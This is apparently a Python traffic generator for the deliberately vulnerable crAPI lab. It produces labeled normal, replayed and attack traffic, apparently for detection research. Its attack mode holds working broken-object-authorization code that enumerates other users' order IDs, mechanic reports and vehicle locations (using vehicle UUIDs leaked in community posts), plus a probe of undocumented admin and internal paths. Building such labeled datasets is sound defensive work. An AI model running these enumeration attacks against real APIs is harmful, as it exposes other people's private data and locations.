#!/usr/bin/env python3
"""crAPI 트래픽 생성기 v3 — 컨테이너 하나가 사용자 한 명(또는 공격 1종)이고, 컨테이너마다 출발지 IP 가 다르다.

  python crapi_traffic_v3.py normal <번호> <분>                  규칙 기반 정상 사용자 (v2 와 같은 행동표 + 차량 등록·정비 요청)
  python crapi_traffic_v3.py replay <번호> <분> <세션파일>       공개 데이터 재생 사용자 (요청 간격·행동 종류를 실제 세션에서 가져옴)
  python crapi_traffic_v3.py attack <종류> [간격min 간격max]     공격 1종 (ATTACKS)

v2(crapi_generality_2026-11-15/crapi_traffic.py)에서 달라진 것
  - 가입 후 메일(mailhog)의 VIN·Pincode 로 차량을 등록한다 → 게시글 작성자에 차량 ID(UUID)가 실린다 → 차량 위치 BOLA 를 실제로 돌릴 수 있다
  - 정상 사용자가 가끔 정비 요청을 낸다 → 정비 보고서가 실제로 생긴다 → 보고서 BOLA 가 오류 없이 200 으로 돌아온다
  - replay 모드 (README §3 의 대응표)

끝날 때 `LABEL {json}` 한 줄을 표준출력에 남긴다(종류·IP·시작·종료·요청 수·응답 코드) → 정답 라벨.
표준 라이브러리만 쓴다.
"""
import gzip
import json
import os
import quopri
import random
import re
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib
from collections import Counter

WEB = "http://crapi-web:80"
MAIL = "http://mailhog:8025"
UA_BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"
UA_TOOL = "python-requests/2.32"
CODES = Counter()
GAP_CAP = 300          # replay: 세션 안 간격 상한(초). 그보다 긴 실제 간격은 300초로 줄인다
BREAK = (30, 180)      # replay: 세션과 세션 사이 쉬는 시간(초)


def call(method, path, token=None, body=None, ua=UA_BROWSER, base=WEB, count=True):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(base + path, data=data, method=method)
    req.add_header("User-Agent", ua)
    if data:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read()
            if count:
                CODES[r.status] += 1
            return r.status, (json.loads(raw) if raw[:1] in (b"{", b"[") else None)
    except urllib.error.HTTPError as e:
        if count:
            CODES[e.code] += 1
        return e.code, None
    except Exception:
        if count:
            CODES[0] += 1
        return 0, None


def account(tag, ua=UA_BROWSER):
    """가입(이미 있으면 무시) → 로그인 → (토큰, 이메일)"""
    email = f"{tag}@example.test"
    num = str(zlib.crc32(tag.encode()) % 10**10).zfill(10)
    call("POST", "/identity/api/auth/signup", body={"name": tag, "email": email, "number": num, "password": "Lab!pass123"}, ua=ua)
    for _ in range(6):
        s, d = call("POST", "/identity/api/auth/login", body={"email": email, "password": "Lab!pass123"}, ua=ua)
        if s == 200 and d and d.get("token"):
            return d["token"], email
        time.sleep(2)
    sys.exit(f"login failed for {tag}")


def register_vehicle(tok, email, ua=UA_BROWSER):
    """가입 환영 메일에서 VIN·Pincode 를 읽어 차량을 등록 → (uuid, vin). 이미 등록돼 있으면 그대로 돌려준다."""
    s, v = call("GET", "/identity/api/v2/vehicle/vehicles", tok, ua=ua)
    if not (isinstance(v, list) and v):
        for _ in range(10):
            s, d = call("GET", "/api/v2/search?kind=to&query=" + urllib.parse.quote(email), base=MAIL, count=False)
            for m in (d or {}).get("items", []):
                txt = quopri.decodestring((m.get("Raw") or {}).get("Data", "").encode()).decode("utf-8", "replace")
                vin = re.search(r"VIN:\s*(?:<[^>]+>\s*)*([A-Z0-9]{17})", txt)
                pin = re.search(r"Pincode:\s*(?:<[^>]+>\s*)*(\d{4})", txt)
                if vin and pin:
                    call("POST", "/identity/api/v2/vehicle/add_vehicle", tok, {"vin": vin.group(1), "pincode": pin.group(1)}, ua=ua)
                    break
            s, v = call("GET", "/identity/api/v2/vehicle/vehicles", tok, ua=ua)
            if isinstance(v, list) and v:
                break
            time.sleep(3)
    if isinstance(v, list) and v:
        return v[0].get("uuid"), v[0].get("vin")
    return None, None


def my_ip():
    return socket.gethostbyname(socket.gethostname())


def report(kind, t0, extra=None):
    out = {"kind": kind, "ip": my_ip(), "start": int(t0), "end": int(time.time()),
           "requests": sum(CODES.values()), "codes": dict(sorted(CODES.items()))}
    out.update(extra or {})
    print("LABEL " + json.dumps(out, ensure_ascii=False), flush=True)


class User:
    """한 사용자가 할 수 있는 '화면 단위' 행동. normal·replay 가 같이 쓴다."""

    def __init__(self, tag, rng):
        self.rng = rng
        self.tok, self.email = account(tag)
        self.uuid, self.vin = register_vehicle(self.tok, self.email)
        self.my_orders, self.my_reports, self.post_ids = [], [], []
        self.posted = False

    def home(self):
        call("GET", "/")
        call("GET", "/identity/api/v2/user/dashboard", self.tok)

    def vehicles(self):
        call("GET", "/identity/api/v2/vehicle/vehicles", self.tok)
        if self.uuid:                                           # 자기 차량 위치만 본다
            call("GET", f"/identity/api/v2/vehicle/{self.uuid}/location", self.tok)

    def shop_view(self):
        s, d = call("GET", "/workshop/api/shop/products", self.tok)
        return (d or {}).get("products", []) if isinstance(d, dict) else []

    def shop_order(self, cap=8):
        if len(self.my_orders) >= cap:                          # 잔액(100) 안에서만 — 넘으면 주문 내역 보기로 바꾼다
            return self.orders()
        prods = self.shop_view()
        if prods:
            s, d = call("POST", "/workshop/api/shop/orders", self.tok, {"product_id": self.rng.choice(prods)["id"], "quantity": 1})
            if s in (200, 201) and d and d.get("id"):
                self.my_orders.append(d["id"])
        call("GET", "/workshop/api/shop/orders/all", self.tok)

    def orders(self):
        call("GET", "/workshop/api/shop/orders/all", self.tok)
        if self.my_orders:                                      # 자기 주문만 연다
            call("GET", f"/workshop/api/shop/orders/{self.rng.choice(self.my_orders)}", self.tok)

    def community_list(self):
        s, d = call("GET", "/community/api/v2/community/posts/recent", self.tok)
        posts = d.get("posts", []) if isinstance(d, dict) else (d or [])
        self.post_ids = [p.get("id") for p in posts if isinstance(p, dict) and p.get("id")][:30]

    def community_read(self):
        if not self.post_ids:
            self.community_list()
        if self.post_ids:
            call("GET", f"/community/api/v2/community/posts/{self.rng.choice(self.post_ids)}", self.tok)

    def community_post(self):
        call("POST", "/community/api/v2/community/posts", self.tok,
             {"title": f"note {self.rng.randint(1, 9999)}", "content": "service was fine"})
        self.posted = True

    def community_comment(self):
        if not self.post_ids:
            self.community_list()
        if self.post_ids:
            pid = self.rng.choice(self.post_ids)
            call("GET", f"/community/api/v2/community/posts/{pid}", self.tok)
            call("POST", f"/community/api/v2/community/posts/{pid}/comment", self.tok, {"content": "thanks"})

    def mechanic(self):
        s, d = call("GET", "/workshop/api/mechanic/", self.tok)
        mech = (d or {}).get("mechanics", []) if isinstance(d, dict) else []
        if mech and self.vin and len(self.my_reports) < 2 and self.rng.random() < 0.35:
            s, d = call("POST", "/workshop/api/merchant/contact_mechanic", self.tok,
                        {"mechanic_code": mech[0]["mechanic_code"], "problem_details": "strange noise", "vin": self.vin,
                         "mechanic_api": WEB + "/workshop/api/mechanic/receive_report", "repeat_request_if_failed": False, "number_of_repeats": 1})
            m = re.search(r"report_id=(\d+)", json.dumps(d or {}))
            if m:
                self.my_reports.append(int(m.group(1)))
        elif self.my_reports:                                   # 자기 보고서만 연다
            call("GET", f"/workshop/api/mechanic/mechanic_report?report_id={self.rng.choice(self.my_reports)}", self.tok)


# ── 규칙 기반 정상 사용자 ──────────────────────────────────────────────────────
def normal(n, minutes):
    rng = random.Random(3000 + n)
    time.sleep(rng.uniform(0, 30))
    t0 = time.time()
    u = User(f"g3n{n:03d}", rng)
    end = t0 + minutes * 60

    def shop():
        u.shop_order() if rng.random() < 0.15 and len(u.my_orders) < 3 else u.shop_view()

    def community():
        u.community_list()
        if not u.posted or rng.random() < 0.05:
            u.community_post()
        elif rng.random() < 0.6:
            u.community_read()

    acts = [(u.home, 3), (u.vehicles, 2), (shop, 4), (u.orders, 2), (community, 4), (u.mechanic, 1)]
    pool = [f for f, w in acts for _ in range(w)]
    while time.time() < end:
        rng.choice(pool)()
        time.sleep(rng.uniform(3, 12) if rng.random() < 0.9 else rng.uniform(20, 60))
    report("normal_generator", t0, {"user": n, "vehicle": bool(u.uuid), "orders": len(u.my_orders), "reports": len(u.my_reports)})


# ── 공개 데이터 재생 사용자 ────────────────────────────────────────────────────
def replay(n, minutes, path):
    rng = random.Random(7000 + n)
    sessions = [json.loads(l) for l in gzip.open(path, "rt", encoding="utf-8")]
    time.sleep(rng.uniform(0, 30))
    t0 = time.time()
    u = User(f"r3p{n:03d}", rng)
    end = t0 + minutes * 60
    played = Counter()
    events = 0
    while time.time() < end:
        s = rng.choice(sessions)
        played[s["src"]] += 1
        u.home()                                                # 방문 시작 화면 (규칙 — 데이터에 없음)
        if rng.random() < 0.2:
            u.vehicles()                                        # 차량 화면 (규칙 — 대응하는 공개 데이터가 없음)
        for gap, kind in s["events"]:
            wait = min(gap, GAP_CAP)
            if time.time() + wait >= end:
                break
            time.sleep(wait)
            events += 1
            if s["src"] == "otto":
                if kind == "orders":
                    u.shop_order()
                else:                                           # clicks · carts → 상점 화면 (crAPI 에는 상품 상세·장바구니가 없다)
                    u.shop_view()
            else:
                if kind == "POST_QUESTION":
                    u.community_post()
                elif kind in ("POST_ANSWER", "COMMENT"):
                    u.community_comment()
                else:                                           # EDIT_* · VOTE_* → 글 읽기
                    u.community_read()
        else:
            time.sleep(min(rng.uniform(*BREAK), max(0, end - time.time())))
            continue
        break
    report("normal_replay", t0, {"user": n, "vehicle": bool(u.uuid), "sessions": dict(played), "events": events, "orders": len(u.my_orders)})


# ── 공격 ───────────────────────────────────────────────────────────────────────
ATTACKS = ["bola_orders_fast", "bola_orders_slow", "bola_orders_slow_shuffled", "bola_report_slow",
           "bola_vehicle_slow", "bola_vehicle_fast", "shadow_probe"]


def collect_vehicle_ids(tok, ua, want=25):
    """게시글 작성자에 실린 남의 차량 ID(UUID)를 모은다 — crAPI 의 실제 정보 노출 지점."""
    vids, offset = [], 0
    for _ in range(12):
        s, d = call("GET", f"/community/api/v2/community/posts/recent?limit=30&offset={offset}", tok, ua=ua)
        posts = d.get("posts", []) if isinstance(d, dict) else []
        for p in posts:
            v = (p.get("author") or {}).get("vehicleid") if isinstance(p, dict) else None
            if v and v not in vids:
                vids.append(v)
        nxt = d.get("next_offset") if isinstance(d, dict) else None
        if len(vids) >= want or not posts or nxt in (None, offset):
            break
        offset = nxt
        time.sleep(1)
    return vids[:want]


def attack(kind, gap):
    rng = random.Random(zlib.crc32(kind.encode()) & 0xffff)
    t0 = time.time()
    ua = UA_TOOL
    tok, _ = account("atk3_" + kind, ua)
    wait = lambda: time.sleep(rng.uniform(*gap))
    extra = {"gap": list(gap)}

    if kind.startswith("bola_orders"):
        ids = list(range(1, 61 if kind.endswith("fast") else 26))
        if os.environ.get("ATTACK_N"):                          # 시연용: 열거할 개수를 줄인다 (기본은 위 값)
            ids = ids[:int(os.environ["ATTACK_N"])]
        if kind.endswith("shuffled"):
            rng.shuffle(ids)
        ok = 0
        for i in ids:
            s, _ = call("GET", f"/workshop/api/shop/orders/{i}", tok, ua=ua); ok += s == 200; wait()
        extra.update(target="/workshop/api/shop/orders/{id}", returned_200=ok)

    elif kind == "bola_report_slow":
        ok = 0
        for i in range(1, 26):
            s, _ = call("GET", f"/workshop/api/mechanic/mechanic_report?report_id={i}", tok, ua=ua); ok += s == 200; wait()
        extra.update(target="/workshop/api/mechanic/mechanic_report?report_id={id}", returned_200=ok)

    elif kind.startswith("bola_vehicle"):
        vids = collect_vehicle_ids(tok, ua)
        ok = 0
        for v in vids:
            s, _ = call("GET", f"/identity/api/v2/vehicle/{v}/location", tok, ua=ua); ok += s == 200; wait()
        extra.update(target="/identity/api/v2/vehicle/{uuid}/location", distinct_vehicles=len(vids), returned_200=ok)

    elif kind == "shadow_probe":
        paths = ["/identity/api/auth/v1/check-otp", "/identity/api/v1/user/dashboard", "/workshop/api/shop/orders/export",
                 "/workshop/api/admin/users", "/community/api/v1/community/posts/recent", "/identity/api/v2/user/all",
                 "/workshop/api/management/users/1", "/identity/api/v2/vehicle/all", "/workshop/api/shop/coupons",
                 "/community/api/v2/community/posts/all", "/identity/api/auth/v2/login", "/workshop/api/internal/health"]
        for p in paths:
            call("GET", p, tok, ua=ua); wait()
        extra["target"] = "명세 밖 경로 12개"
    else:
        sys.exit(f"unknown attack {kind} — {ATTACKS}")
    report(kind, t0, extra)


if __name__ == "__main__":
    mode = sys.argv[1]
    if mode == "normal":
        normal(int(sys.argv[2]), float(sys.argv[3]))
    elif mode == "replay":
        replay(int(sys.argv[2]), float(sys.argv[3]), sys.argv[4])
    else:
        g = (float(sys.argv[3]), float(sys.argv[4])) if len(sys.argv) > 4 else (14.0, 26.0)
        attack(sys.argv[2], g)
